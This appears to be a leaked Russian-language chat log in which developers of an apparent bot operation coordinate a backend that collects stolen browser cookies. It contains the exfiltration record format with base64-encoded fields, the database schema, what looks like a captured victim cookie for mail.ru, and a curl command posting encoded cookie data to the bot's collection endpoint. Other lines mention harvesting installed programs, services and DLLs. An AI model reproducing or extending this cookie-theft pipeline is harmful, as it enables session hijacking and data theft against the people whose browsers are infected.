2021-08-31 09:05:45.411409	ttrr	buza	[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);

вот 4 поля декодируются только
2021-08-31 09:05:49.215919	ttrr	buza	надо все ?
2021-08-31 09:07:35.427574	ttrr	buza	Нужно домен ещё декодировать
2021-08-31 09:08:11.256677	ttrr	buza	ок .. добавил в новых версиях .
2021-08-31 09:09:24.730915	ttrr	buza	<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]
2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<"22021">>,<<"invalid byte sequence for encoding \"UTF8\": 0x95">>,[]} with query {<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">>,[<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]}

есть еще такое
2021-08-31 09:09:32.432028	ttrr	buza	на УТФ-8 не походит кодировка
2021-08-31 09:09:59.455581	ttrr	buza	И ещё нужно 2 поля добавить в конец записи.
secure, httponly
Значения: 0 & 1
2021-08-31 09:10:00.420547	ttrr	buza	насколько я понимаю это про <<149,166,247>>
2021-08-31 09:10:26.178925	ttrr	buza	в таблицу колонки ?
2021-08-31 09:10:55.308393	ttrr	buza	Да, в запись поле, в таблицу колонки.
2021-08-31 09:11:43.257386	ttrr	buza	А юникод в каком поле не проходит?
2021-08-31 09:20:09.636154	ttrr	buza	,<<149,166,247>> я думаю вот это не может быть юникодом
2021-08-31 09:20:45.226606	ttrr	buza	юзернейм
2021-08-31 09:22:08.345041	ttrr	buza	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
А ты можешь в readme этот формат добавить + описание ошибок?
Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
2021-08-31 09:23:06.135462	ttrr	buza	формат чего ?
2021-08-31 09:23:49.262733	ttrr	buza	в каталог doc есть некоторое описалово
2021-08-31 09:23:54.884501	ttrr	buza	Кукисов, например. Ещё бы хорошо остальные данные проверить.
2021-08-31 09:24:07.888534	ttrr	buza	Там кукисы описаны?
2021-08-31 09:24:16.335063	ttrr	buza	какие кукисы ?
2021-08-31 09:24:39.286025	ttrr	buza	Куки, печенюшки
2021-08-31 09:24:57.065045	ttrr	buza	я понял что такое куки, но к чему ты это говоришь ?
2021-08-31 09:25:05.873569	ttrr	buza	1. Создать новую команду для получения данных куки. Например, код команды 84

2. Создать таблицу для хранения данных (псевдокод SQL):
CREATE TABLE cookies (
  id SERIAL,
  username VARCHAR(255),
  browser VARCHAR(255)
  domain VARCHAR(255)
  cookie_name VARCHAR(255)
  cookie_value VARCHAR(255)
  created DATETIME,
  expires DATETIME,
  path VARCHAR(255)
);

3. Обеспечить прием данных в следующем формате:
- простой текст, разделенный на строки.
Разделитель строк - может быть как UNIX, так и DOS.
Одна строка - одна запись.
Разделитель полей в записи - вертикальная черта |
Формат записи:

username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n

где

username     - имя пользователя
browser      - код броузера (enum = chrome|ff|ie|edge)
domain       - домен куки
cookie_name  - имя куки
cookie_value - значение куки
created      - дата-время создания, Unix time
expires      - дата-время истечения, Unix time
path         - путь URI
2021-08-31 09:26:49.566595	ttrr	buza	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
2021-08-31 09:28:37.305847	ttrr	buza	нету про базе64 .. сами добавили очевидно
2021-08-31 09:28:51.259285	ttrr	buza	чтобы экранировать символы
2021-08-31 09:29:50.579846	ttrr	buza	Ну, вот это и нужно в доку добавить.
created у нас в секундах?
2021-08-31 09:30:27.363742	ttrr	buza	created_at я ставлю сам как NOW()
2021-08-31 09:30:36.631744	ttrr	buza	Не догадываться же, как там отстойник обрабатывает, верно?
2021-08-31 09:31:00.361505	ttrr	buza	а .есть другой ..
2021-08-31 09:31:02.580980	ttrr	buza	щас посмотрю
2021-08-31 09:31:21.648550	ttrr	buza	А NOW() в секундах?
2021-08-31 09:32:35.413827	ttrr	buza	забей на NOW() это другое
2021-08-31 09:36:27.499568	ttrr	buza	CREATE TABLE public.data84 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    created_at timestamp without time zone,
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text
);
2021-08-31 09:36:31.362123	ttrr	buza	вот таблица
2021-08-31 09:36:37.403462	ttrr	buza	created - просто текст
2021-08-31 09:36:41.644549	ttrr	buza	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 09:36:43.346479	ttrr	buza	всё - просто текст
2021-08-31 09:37:34.039517	ttrr	buza	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 09:39:30.947256	ttrr	buza	Ну, это тоже не очевидно)
По факту ошибки посыпались. Документация не полная.
2021-08-31 09:41:31.313235	ttrr	buza	где же ты был )
2021-08-31 10:40:22.320152	ttrr	buza	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 10:40:58.852427	ttrr	buza	Я написал миграции под два поля secure и httponly
2021-08-31 10:41:19.040024	ttrr	buza	Оба логических.
2021-08-31 10:41:50.949817	ttrr	buza	не буду делать .
2021-08-31 10:41:53.240018	ttrr	buza	и в 90 команду добавились новые поля
2021-08-31 10:42:06.308337	ttrr	buza	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 10:42:24.069780	ttrr	buza	поля не будут сохраняться, если их больше?
2021-08-31 10:42:41.757952	ttrr	buza	dlls, programs, services Я тоже уже добавил
2021-08-31 10:42:55.645696	ttrr	buza	а, ок
2021-08-31 10:42:55.697776	ttrr	buza	Пока не накатил, сек сделаю
2021-08-31 10:44:25.979318	ttrr	buza	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 10:44:38.108248	ttrr	buza	И в бэке его тоже вроде как нет
2021-08-31 10:44:40.986068	ttrr	buza	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 10:46:16.069302	ttrr	buza	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:01:29.529553	ttrr	buza	По 2м полям в куках накатил миграции.
2021-08-31 14:33:07.584222	ttrr	buza	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 14:34:45.522696	buza	ttrr	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 14:34:45.526331	ttrr	buza	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 14:34:50.755310	buza	ttrr	потому повтори этот вопрос как он появится
2021-08-31 14:34:50.757702	ttrr	buza	потому повтори этот вопрос как он появится
2021-08-31 14:35:16.319715	ttrr	buza	Оке, тут получается нет истории..
2021-08-31 14:35:52.752119	buza	ttrr	неа
2021-08-31 14:35:52.755543	ttrr	buza	неа
2021-09-02 11:40:03.475571	ttrr	buza	потом когда конфа будет не актуальна звездочку снимите
2021-09-02 11:40:03.476572	ttrr	buza	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-02 11:40:03.477426	ttrr	buza	oad
2021-09-02 11:40:03.478257	ttrr	buza	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-02 11:40:03.479115	ttrr	buza	Как повторить к сожалению не знаю пока
2021-09-02 11:40:03.479960	ttrr	buza	всем привет
2021-09-02 11:40:03.481066	ttrr	buza	как дела с деро?
2021-09-02 11:40:03.481830	ttrr	buza	zulas: понятна проблема?
2021-09-02 11:40:03.482359	ttrr	buza	деф . привет .. а в чем проблема ?
2021-09-02 11:40:03.483244	ttrr	buza	driver: отпиши что ты мне написал сюда
2021-09-02 11:40:03.484198	ttrr	buza	ответ 403 был
2021-09-02 11:40:03.484930	ttrr	buza	с ним разобрались?
2021-09-02 11:40:03.485901	ttrr	buza	Бэк отвечает 403 на попытку отправить куки.
2021-09-02 11:40:03.486747	ttrr	buza	Внесли ли изменения связанные с новыми полями?
2021-09-02 11:40:03.487800	ttrr	buza	давайте конкретно: кто и что должен внести?
2021-09-02 11:40:03.488484	ttrr	buza	тк походу зулас даже не в курсе
2021-09-02 11:40:03.489185	ttrr	buza	4ый день мы тут что то обсуждаем, а в итоге ничего не делаем
2021-09-02 11:40:03.490286	ttrr	buza	в чем проблема?
2021-09-02 11:40:03.490703	ttrr	buza	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 11:40:03.491918	ttrr	buza	В базу должны записываться поля с такими же именами
2021-09-02 11:41:12.881216	ttrr	buza	я ничего не вносил пока ..
2021-09-02 11:41:48.444791	buza	ttrr	так уже пора внести
2021-09-02 11:41:48.448786	ttrr	buza	так уже пора внести
2021-09-02 11:41:53.191108	buza	ttrr	драйвер же просил
2021-09-02 11:41:53.195192	ttrr	buza	драйвер же просил
2021-09-02 11:42:05.651449	buza	ttrr	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:05.654709	ttrr	buza	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:10.209571	ttrr	buza	Ок. Когда?
2021-09-02 11:43:37.294432	ttrr	buza	Я не стал этого делать потому что мне сказали, что сейчас zulas занимается бэком, но я напрямую не писал задачу.
Возможно решил что вы с кодером модуля обсудили этот момент
2021-09-02 11:44:33.237267	ttrr	buza	(31.08.2021 13:44:35) zulas: добавляй сразу всё чтобы мне не возвращаться
(31.08.2021 13:46:11) driver: Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
(31.08.2021 14:01:24) driver: По 2м полям в куках накатил миграции.
2021-09-02 11:44:45.185319	ttrr	buza	ну вообще надо все сразу сделать и чтобы не возвращаться
2021-09-02 11:44:52.285203	ttrr	buza	переключение контекста -- очень тяжелая операция )
2021-09-02 11:45:14.306121	ttrr	buza	так что 
1. я жду когда в базу нужное внесется
2. когда мне будет объяснено что нужно делать
2021-09-02 11:59:16.908092	buza	ttrr	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 11:59:16.915112	ttrr	buza	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 12:03:26.089525	buza	ttrr	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:26.092631	ttrr	buza	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:33.358788	buza	ttrr	что нужно от зуласа?
2021-09-02 12:03:33.364153	ttrr	buza	что нужно от зуласа?
2021-09-02 12:11:37.699658	ttrr	buza	Дело в том что миграция по десктопу относится к другой задаче.
2021-09-02 12:11:51.014577	ttrr	buza	Сейчас нужно сделать 2 этих поля
2021-09-02 12:12:18.866061	buza	ttrr	zulas: сделаешь?
2021-09-02 12:12:18.869679	ttrr	buza	zulas: сделаешь?
2021-09-02 12:14:06.096417	ttrr	buza	Более того к другой команде и к другой таблице.
2021-09-02 12:15:43.896786	ttrr	buza	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-02 12:17:36.622635	ttrr	buza	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 12:18:22.061675	ttrr	buza	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-02 12:20:09.145575	ttrr	buza	ок .. сейчас в базе поля уже есть ?
2021-09-02 12:20:19.949749	ttrr	buza	Да
2021-09-02 12:28:19.570896	ttrr	buza	а старые клиенты еще работают ?
2021-09-02 12:28:40.296832	ttrr	buza	т.е. надо поддерживать и старый формат и новый ?
2021-09-02 12:29:44.532344	ttrr	buza	Нет, просто только новый должен начать работать.
2021-09-02 12:30:37.242447	ttrr	buza	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-02 12:59:04.944086	ttrr	buza	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-02 13:03:56.540055	ttrr	buza	хорошо сделаю
2021-09-02 13:23:09.878163	ttrr	buza	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-02 13:23:13.462035	ttrr	buza	такая последовательность ?
2021-09-02 13:23:20.883767	ttrr	buza	@driver
2021-09-02 13:26:58.912089	ttrr	buza	@defender как мне запушить изменения ?
2021-09-02 13:37:09.262183	ttrr	buza	Да все верно.
2021-09-02 14:18:44.636605	ttrr	buza	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-06 10:10:21.977774	ttrr	buza	сегодня отдых у всех ?
2021-09-13 12:50:12.637875	ttrr	buza	сегодня отдых у всех ?
2021-09-13 12:50:18.677351	buza	ttrr	есть кто
2021-09-13 12:50:18.678550	ttrr	buza	есть кто
2021-09-14 10:06:28.575970	ttrr	buza	сегодня отдых у всех ?
2021-09-14 10:06:28.576902	ttrr	buza	есть кто
